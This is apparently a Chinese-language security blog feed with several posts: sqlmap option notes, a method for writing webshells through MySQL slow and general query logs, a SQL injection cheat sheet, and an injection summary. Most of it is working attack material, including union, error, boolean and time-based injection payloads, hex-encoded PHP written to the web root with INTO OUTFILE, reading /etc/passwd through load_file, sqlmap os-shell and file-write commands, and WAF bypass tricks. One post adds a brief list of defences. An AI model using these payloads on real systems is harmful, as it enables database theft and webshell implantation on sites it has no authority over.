–referer<br>sqlmap可以在请求中伪造HTTP中的referer。sqlmap -u “<a href="http://www.target.com/?id=1%E2%80%9Dreferer=&quot;">http://www.target.com/?id=1”referer=&quot;</a> <a href="http://www.baidu.com&quot;/">http://www.baidu.com&quot;</a><br>当–level参数设定&gt;&#x3D;3时，会尝试进行referer注入。</p><p>四、设置HTTP数据包相关参数<br>–delay<br>可以设定两个http请求间的延迟，设定为1的时候是1秒，默认是没有延迟的。<br>–timeout<br>可以设定一个http请求超过多少秒判定为超时，默认是30秒。</p><p>五、指定测试参数<br>-p ,<br>sqlmap默认会测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User- Agent和HTTP Referer头的值。<br>例如: -p“id,user-angent”<br>–skip<br>在使用–level时，级别很大的时候，但是有些参数不能去测试，那么可以使用–skip参数跳过。<br>例如: –skip&#x3D;” user-agent,referer”</p><p>六、设定探测等级<br>–level (sqlmap -r情况下)<br>共有五个等级，默认为1，sqlmap使用的payload可以在<br>xml&#x2F;payloads.xml中看到，自己也可以根据相应的格式添加自己的payload。<br>level&gt;&#x3D;2的时候就会测试HTTP Cookie。<br>level&gt;&#x3D;3的时候就会测试HTTP User-Agent&#x2F;Referer头。level&#x3D;5的时候会测试HTTP Host。</p><p>七、设定探测风险等级<br>–risk<br>共有三个风险等级，1-3，<br>默认是1会测试大部分的测试语句，2会增加基于时间的测试语句，3会增加OR语句的SQL注入测试。<br>在有些时候，例如在UPDATE，DELETE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p><p>八、列数据</p><p>–dbs<br>列出所有的数据库<br>列出当前登录的用户名<br>–users,<br>–passwords,<br>列出当前登录的用户密码<br>–is-dba<br>判断是否root权限<br>–technique :指定使用哪种注入类型<br>B:基于Boolean的盲注（Boolean based blind&gt;Q:内联查询(inlin queries)<br>T:基于时间的盲注（time based blind&gt;U:联合查询(union query based)E:错误（error based）<br>S:栈查询(stack queries)<br>速度排序&#x3D;联合&gt;报错&gt;布尔&gt;延迟</p><p>八、列数据<br>–current-db当前数据库–privileges权限<br>-Ddatabase_name –tables<br>-Ddatabase_name -T table_name –columns<br>-D database_name -T table_name -C column_1,column_2 –dump</p><p>九、一些常用的参数<br>–users列数据库管理用户,当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。<br>–current-user在大多数据库中可以获取到管理数据的用户。–is-dba 判断当前的用户是否为管理，是的话会返回True。<br>–privileges当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看那个用户的权限。</p><p>九、一些常用的参数<br>–proxy指定一个代理服务器eg:-proxy <a href="http://local:8080select">http://local:8080select</a> * from users where id&#x3D;l(1’)))<br>–prefix&#x3D;PREFIX注入payload字符串前缀-suffix&#x3D;SUFFIX注入payload字符串后缀<br>eg: sqlmap -u “<a href="http://www.target.com/index.php?id=1%E2%80%9D">www.target.com/index.php?id=1”</a> -p id –prefix “”))))”–suffix“AND (‘1’&#x3D;’1”</p><p>九、一些常用的参数<br>移动文件:<br>sqlmap -u “<a href="http://www.a.com/1.php?id=1%E2%80%9D--file-write=&quot;">www.a.com/1.php?id=1”--file-write=&quot;</a> d:&#x2F;2.txt”–file-dest&#x3D;”E:&#x2F;wwwroot&#x2F;bihuoedu&#x2F;one.php “<br>–batch 全自动<br>–start&#x3D;开始条数–stop&#x3D;结束条数–dump 导出当前数据库所有数据–dump-all 导出数据库所有数据–purge清空缓存目录<br>–sql-shell反弹sqlshell,类似于sql查询分析器默认路径.sqlmap(点sqlmap)</p><p>十、使用shell命令:<br>参数–os-shell(分析一下）<br>前提:需要网站的物理路径，其次是需要有FIILE权限。<br>sqlmap -r“C: \sqlmap\request.txt” -p id –dms mysql –os-shell接下来指定网站可写目录:<br>“C: \www”<br>d : \phpstudy \www(成功)</p><p>十一.sqlmap常用脚本</p><p>序号 脚本名称注释<br>1Ox2char将每个编码后的字符转换为等价表达<br>2apostrophemask单引号替换为Utf8字符<br>3apostrophenullencode替换双引号为%00%27<br>4appendnullbyte有效代码后添加%00<br>5base64encode使用base64编码<br>6between比较符替换为between<br>7bluecoat空格替换为随机空白字符，等号替换为like<br>8chardoubleencode双url编码<br>9charencode将url编码<br>10charunicodeencode 使用unicode编码<br>11charunicodeescape以指定的payload反向编码未编码的字符<br>12commalesslimit改变limit语句的写法<br>13commalessmid改变mid语句的写法<br>14commentbeforeparentheses在括号前加内联注释<br>15concat2concatws替换CONCAT为CONCAT_wS</p>]]></content>
    
    
    
    <tags>
      
      <tag>sqlmap的使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql写马</title>
    <link href="/2021/01/27/sql3/"/>
    <url>/2021/01/27/sql3/</url>
    
    <content type="html"><![CDATA[<p>今天实战的时候遇到写木马被限制了,一时想不起来还有啥方法,于是特出此篇记录….顺便复习一下防御手段</p><h6 id="一-数据库慢日志写木马"><a href="#一-数据库慢日志写木马" class="headerlink" title="一.数据库慢日志写木马"></a>一.数据库慢日志写木马</h6><p>security_file_priv会阻拦我们使用outfile写入文件,没有服务器权限无法修改my.ini配置文件,可以利用慢查询日志写入shell</p><p>有时候全局日志会写死</p><p>使用慢查询日志,只有超时(系统时间)才会被写入日志</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%slow_query_log%&#x27;</span>;  <br><br>-- show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%general_log%&#x27;</span>;  <br>-- show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%slow_query_log%&#x27;</span>;  <br>-- <span class="hljs-keyword">set</span> global <span class="hljs-comment">slow_query_log =</span><span class="hljs-comment">&#x27;C:/phpstudy_pro/WWW/hh.php&#x27;</span><br>-- <span class="hljs-keyword">set</span> <span class="hljs-comment">global slow_query_log_file =</span> <span class="hljs-comment">&#x27;C:/phpstudy_pro/WWW/hh.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>版本不一样,语句写法不一样</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">-- show global variables like &#x27;%long_query_time%&#x27;;适用于小皮面板的环境</span><br><span class="language-xml">-- select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; or sleep(11); </span><br></code></pre></td></tr></table></figure><h6 id="二-数据库全局日志写木马"><a href="#二-数据库全局日志写木马" class="headerlink" title="二.数据库全局日志写木马"></a>二.数据库全局日志写木马</h6><p>查看是否开启全局日志</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%general%&#x27;</span>; <br></code></pre></td></tr></table></figure><p>开启全局日志 </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-keyword">on</span>; <br></code></pre></td></tr></table></figure><p> 将全局日志路径设置为shell文件路径 </p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file = <span class="hljs-string">&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;</span>;  <br></code></pre></td></tr></table></figure><p>执行语句,日志记录语句,并会执行</p><h6 id="三-sql注入防御"><a href="#三-sql注入防御" class="headerlink" title="三.sql注入防御"></a>三.sql注入防御</h6><p>防御sql注入的核心思想就是对用户输入的数据进行严格的检查,并且对数据库的使用最小权限分配规则.目前sql注入的防御手段有以下几种:</p><p>1.预编译(PDO)</p><p>一般遇到这种,如果后端代码编写没有逻辑上的错误,一般都注入不成功,但是有个特例,如果具有order by 语句的话不能使用预编译(因为”order by后不能参数化的本质是：一方面预编译又只有自动加引号的setString()方法，没有不加引号的方法；而另一方面order by后接的字段名不能有引号。”)</p><p>2.基于攻击特征的匹配过滤.</p><p>这是目前使用最广泛大的方式,系统会将攻击特征做成数据库,一旦匹配到这些攻击特征就会认定检测得到sql注入.这种方式可以有效的过滤大部分sql注入攻击,但是大大增加了程序的复杂度,同时也有可能影响到业务的正常查询.</p><p>3.对用户输入进行转义.</p><p>例如,常见的SQL注入语句中都有单引号双引号之类的,通过转义,SQL注入就不会达到攻击者所预期的执行效果,从而是实现对sql注入进行防御</p><p>4.数据类型进行严格定义.数据长度进行严格规定.</p><p>比如查询数据库某条记录的id,定义它为整形如果用户输入的数据不符合条件,要对数据进行过滤,数据长度也应该做严格的限制,可以防止较长的SQL注入语句.</p><p>5.严格限制网站访问数据库的权限</p><p>6.其他防御措施.例如避免网站显示sql执行错误信息,防止攻击者使用基于错误的方式进行注入;每个数据层编码同意,防止过滤模型被绕过等</p><p>7.相关函数</p><p>inteval(数字化) addslashes(转义),mysql_real_eacape_string()(这个好想已经被弃用)</p><p>这几天实战发现有些后端编写有点那啥,一输入单引号或者双引号,直接die掉程序(部分搜索之类功能),有的更是离谱,有一个括号加空格闭合的.这比n个单双引号闭合还离谱.</p>]]></content>
    
    
    <categories>
      
      <category>sql写马</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql写马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入备忘录</title>
    <link href="/2021/01/25/sql2/"/>
    <url>/2021/01/25/sql2/</url>
    
    <content type="html"><![CDATA[<h2 id="SQL注入备忘表"><a href="#SQL注入备忘表" class="headerlink" title="SQL注入备忘表"></a>SQL注入备忘表</h2><h4 id="一-联合注入"><a href="#一-联合注入" class="headerlink" title="一 . 联合注入"></a>一 . 联合注入</h4><p>列出所有数据库 : </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">limit</span> 一个一个打印出来库名<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">SCHEMA_NAME</span> <span class="hljs-keyword">from</span> information_schema.SCHEMATA <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br>group_concat 一次性全部显示<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">SCHEMA_NAME</span>) <span class="hljs-keyword">from</span> information_schema.SCHEMATA<br><br></code></pre></td></tr></table></figure><p>列出(数据库：test)中所有的表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">limit</span> 一个一个打印出来字段名<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">TABLE_NAME</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br>group_concat 一次性全部显示<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">TABLE_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-number">0x674657374</span><br>注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。<br></code></pre></td></tr></table></figure><p>列出（数据库：test 表：admin ）中所有的字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">imit 一个一个打印出来<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">COLUMNS</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;t10&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br>group_concat 一次性全部显示<br><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">COLUMN_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">COLUMNS</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-number">0x74657374</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-number">0x61646d696e</span><br><br></code></pre></td></tr></table></figure><p>列出（数据库：test 表：admin ）中所有的字段内容</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">limit</span> 一个一个打印出来<br><span class="hljs-keyword">select</span> username,passwd <span class="hljs-keyword">from</span> test.<span class="hljs-keyword">admin</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br>group_concat 把 一次性全部打印<br><span class="hljs-keyword">select</span> group_concat(concat(username,<span class="hljs-number">0x20</span>,passwd)) <span class="hljs-keyword">from</span> test.<span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure><h4 id="二-报错注入"><a href="#二-报错注入" class="headerlink" title="二 . 报错注入"></a>二 . 报错注入</h4><p>请注意,如果需要全部显示数据库需要用到substr函数</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> substr(字符串,<span class="hljs-number">1</span>,截取长度)<br><span class="hljs-keyword">select</span> substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">SCHEMA_NAME</span>) <span class="hljs-keyword">from</span> information_schema.SCHEMATA),<span class="hljs-number">1</span>,<span class="hljs-number">7</span>);<br></code></pre></td></tr></table></figure><h6 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错 :"></a>floor报错 :</h6><p>获取总共多少数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> count(*),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> concat(<span class="hljs-number">0x7e</span>,count(<span class="hljs-built_in">schema_name</span>),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.schemata)) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a)<br></code></pre></td></tr></table></figure><p>列出数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">单个列出 :<br><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(*),concat(concat((<span class="hljs-keyword">select</span> <span class="hljs-built_in">SCHEMA_NAME</span> <span class="hljs-keyword">from</span> information_schema.SCHEMATA <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)y)<br></code></pre></td></tr></table></figure><p>查询表和字段直接把联合注入的payload放进去就可以了</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(*),concat(concat((payload),<span class="hljs-number">0x7e</span>),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)y)<br></code></pre></td></tr></table></figure><h6 id="ExtractValue报错"><a href="#ExtractValue报错" class="headerlink" title="ExtractValue报错"></a>ExtractValue报错</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">extractvalue</span>(<span class="hljs-number">1</span>, (<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(payload),<span class="hljs-number">0</span>x7e))<br><br><span class="hljs-keyword">and</span> <span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-variable">@@version</span>),<span class="hljs-number">0</span>x7e))<br></code></pre></td></tr></table></figure><h6 id="UpdateXML报错"><a href="#UpdateXML报错" class="headerlink" title="UpdateXML报错"></a>UpdateXML报错</h6><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and updatexml(<span class="hljs-number">1</span>,(<span class="hljs-name">payload</span>),<span class="hljs-number">1</span>)<br><br>and updatexml(<span class="hljs-number">1</span>, (<span class="hljs-name">concat</span>(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span> user()),<span class="hljs-number">0</span>x7e)),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="三-布尔注入"><a href="#三-布尔注入" class="headerlink" title="三 .布尔注入 :"></a>三 .布尔注入 :</h3><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and (<span class="hljs-name">select</span> ascii(<span class="hljs-name">substr</span>((<span class="hljs-name">payload</span>), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)))&gt;105 <br></code></pre></td></tr></table></figure><h3 id="四-时间注入"><a href="#四-时间注入" class="headerlink" title="四 . 时间注入 :"></a>四 . 时间注入 :</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">if</span>(ascii(substr((payload), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))=<span class="hljs-number">114</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="五-宽字节注入"><a href="#五-宽字节注入" class="headerlink" title="五 .宽字节注入"></a>五 .宽字节注入</h3><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cos">GB2312,GBK,GB18030,BIG5等这些都是常见的宽字节,实际为<span class="hljs-number">2</span>字节<br><br>如果使用了类似于<span class="hljs-keyword">set</span> names gbk这样得语句,此时mysql数据库就会将<br><br><span class="hljs-keyword">Ascii</span>大于<span class="hljs-number">128</span>(<span class="hljs-built_in">%df</span>)得字符当作是汉字字符得一部分,从而能吃掉\,引入单引号或者双引号<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>sql注入备忘录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入备忘录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql总结</title>
    <link href="/2021/01/24/sql1/"/>
    <url>/2021/01/24/sql1/</url>
    
    <content type="html"><![CDATA[<h4 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h4><h6 id="一-根据sql数据类型分类"><a href="#一-根据sql数据类型分类" class="headerlink" title="一.根据sql数据类型分类"></a>一.根据sql数据类型分类</h6><p>加单引号,报错可能有注入,不报错没有注入</p><p>1.整形注入(不需要闭合,注释)</p><p>2.字符串类型注入(需要闭合,注释)</p><h6 id><a href="#" class="headerlink" title></a></h6><h6 id="二-判断sql注入是整形还是字符串"><a href="#二-判断sql注入是整形还是字符串" class="headerlink" title="二.判断sql注入是整形还是字符串"></a>二.<strong>判断</strong>sql注入是整形还是字符串</h6><p>①.<strong>1a和1也可以判断整形和字符串类型如果是字符串就会没什么区别,要是整形会出现1a报错,1正常显示</strong>(如果有init()整形转化函数,就gg)</p><p>②.and 1&#x3D;1 &#x2F;and1&#x3D;2 回显页面不同(真假判断) (waf拦截) ture or false</p><h6 id="三-引号判断-单引号判断或者双引号-显示数据库错误信息或者页面回显不同"><a href="#三-引号判断-单引号判断或者双引号-显示数据库错误信息或者页面回显不同" class="headerlink" title="三.引号判断(单引号判断或者双引号) 显示数据库错误信息或者页面回显不同"></a><strong>三.引号判断(单引号判断或者双引号) 显示数据库错误信息或者页面回显不同</strong></h6><p>①.(\转义符) 无论整形或者字符串都会报错,只能通过报错信息判断</p><p>②.-1&#x2F;+1通过加减法是否成功(一般用的减法,因为+在一定意义上也代表空格)</p><p>③.and sleep() 通过是否睡眠判断该函数是否执行进而判断是否为字符型还是整形,睡眠成功&#x3D;整形,否者为字符串</p><p>注意:在实战中不能随意根据这些固定的方法去判断这是什么类型,因为我们并不知道它们在后端做了什么过滤,要谨慎下结论</p><h6 id="四-根据注入的类型分类"><a href="#四-根据注入的类型分类" class="headerlink" title="四.根据注入的类型分类"></a>四.根据注入的类型分类</h6><p>1.联合注入查询</p><p>2.报错注入</p><p>3.布尔注入</p><p>4.时间延时注入</p><p>5.宽字节注入</p><p>6二次注入(5,6用于有转义函数的时候addslashes()?)</p><p>7.堆叠注入 多语句查询 后端代码需要有多语句查询语句 5.0以下的版本 </p><p>8.偏移注入(只对access数据库有用,并且在实战中access数据库很少见)</p><p>9.DNS外带注入(这不算是一种类型吧,只是用于注入时比较慢或者不回显的注入 延时,布尔)</p><h6 id="五-mysql中三种注释风格"><a href="#五-mysql中三种注释风格" class="headerlink" title="五.mysql中三种注释风格"></a>五.mysql中三种注释风格</h6><p>1.url 编码为%23 #</p><p>2.– (后面有一个空格)</p><p>3.&#x2F;*….*&#x2F;</p><p>4.&#x2F;*!…*&#x2F;内联注释</p><p>5.&#x2F;*!*&#x2F;本身没有什么意义,只是干扰,select &#x2F;*!@@version&#x2F;</p><p>6.select * &#x2F;*!22222from*&#x2F; users;</p><p>如果当前的数字大于当前的版本则会被注释掉</p><p>否则失效,绕waf</p><h6 id="六-mysql函数利用-可用大小写等绕过waf"><a href="#六-mysql函数利用-可用大小写等绕过waf" class="headerlink" title="六.mysql函数利用,可用大小写等绕过waf"></a>六.mysql函数利用,可用大小写等绕过waf</h6><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autoit">-- <span class="hljs-keyword">select</span> user()         root<span class="hljs-symbol">@localhost</span><br>-- <span class="hljs-keyword">select</span> system_user()   root<span class="hljs-symbol">@localhost</span><br>-- <span class="hljs-keyword">select</span> current_user()      root<span class="hljs-symbol">@localhost</span>(user都是当前用户)<br>-- <span class="hljs-keyword">select</span> session_user()<br>-- root<span class="hljs-symbol">@localhost</span><br>-- <span class="hljs-keyword">select</span> database() pikachu<br>-- <span class="hljs-keyword">select</span> @<span class="hljs-symbol">@version</span> <span class="hljs-number">5.7</span><span class="hljs-number">.26</span><br>-- <span class="hljs-keyword">select</span> version() <span class="hljs-number">5.7</span><span class="hljs-number">.26</span><br>-- <span class="hljs-keyword">select</span> @<span class="hljs-symbol">@basedir</span> C:\phpstudy_pro\Extensions\MySQL5<span class="hljs-number">.7</span><span class="hljs-number">.26</span>\(mysql安装路径)<br>-- <span class="hljs-keyword">select</span> @<span class="hljs-symbol">@datadir</span> C:\phpstudy_pro\Extensions\MySQL5<span class="hljs-number">.7</span><span class="hljs-number">.26</span>\data(MySQL 数据库文件路径,当@<span class="hljs-symbol">@basedir</span>可用)<br>-- <span class="hljs-keyword">select</span> @<span class="hljs-symbol">@version_compile_os</span>    Win64<br></code></pre></td></tr></table></figure><h6 id="七-load-file-读文件操作-任意文件读取"><a href="#七-load-file-读文件操作-任意文件读取" class="headerlink" title="七.load_file() 读文件操作(任意文件读取)"></a>七.<strong>load_file() 读文件操作(任意文件读取)</strong></h6><p>注意:先看看secure_file_priv **show variables like ‘%secure_file_priv%’**是否开启.5.0以上版本默认关闭即使值为null ,为空没有任何东西才会允许load_file,还有写文件</p><p><strong>前提:</strong></p><p><strong>1.知道文件绝对路径</strong></p><p><strong>2.对web目录具有读写权限(基本上只有root权限才有读写权限)</strong></p><p><strong>3.全局gpc函数关闭</strong></p><p>4.**secure_file_priv **为空</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">union</span> select <span class="hljs-number">1</span>,load_file(&#x27;etc/passwd&#x27;),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br><br><span class="hljs-attribute">union</span> select <span class="hljs-number">1</span>,load_file(十六进制),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> 绕过过滤单双引号的限制<br></code></pre></td></tr></table></figure><p>所写的内容+into outfile + ‘保存的文件路径’<strong>写文件操作</strong>(5.3版本之前,会被gpc过滤单双引号,就没办法进行写入文件)</p><p><strong>例如:</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span> <span class="hljs-keyword">into</span> outFILE <span class="hljs-string">&#x27;../../../www/5.php&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.sql.com:<span class="hljs-number">8080</span>/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">0</span>x3c3f70687020706870696e666f28293b3f3e,<span class="hljs-number">3</span> into outFILE &#x27;../../../www/<span class="hljs-number">5</span>.php&#x27; --+<br></code></pre></td></tr></table></figure><p>最后一个显示位不能删掉,不然会报错.</p><p>前提:</p><p><strong>1.知道绝对路径</strong></p><p>2.用户必须有写文件权限 secure_file_priv</p><p>3.对web目录具有读写权限(基本上只有root权限才有读写权限)</p><p><strong>4.get_magic_gpc函数关闭,不然会目录写不进去</strong></p><p><strong>在数据库中into outfile语句把表数据导出到一个文本文件中,那么利用这个语句，再配合满足的‘三个条件’，即可实现文件或者一句话木马导入到数据库文件的目录中。 三个条件： 1.具有root权限。 2.在数据库配置文件中的 配置项含有：secure_file_priv&#x3D;’’。</strong></p><h6 id="八-mysql中union规则"><a href="#八-mysql中union规则" class="headerlink" title="八.  mysql中union规则"></a>八.  mysql中union规则</h6><p>1.union必须由两条或两条以上的select语句组成,语句之间要用关键字union分割</p><p>2.union中的每个查询必须包含相同的列数(字段)</p><p>3.union会从查询结果集中自动去除重复行</p><p>4.只有最后一个select允许有order by</p><p>5.只有最后一个select允许有limit</p><h6 id="-1"><a href="#-1" class="headerlink" title></a></h6><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>1.利用前提:页面上有显示位</p><p>2.优点:方便,快捷,易于利用</p><p>3.缺点:需要显示位</p><p>one:   order by 判断字段数 </p><h6 id="各种操作"><a href="#各种操作" class="headerlink" title="各种操作"></a>各种操作</h6><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> shcema_name <span class="hljs-keyword">from</span> infromation_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span 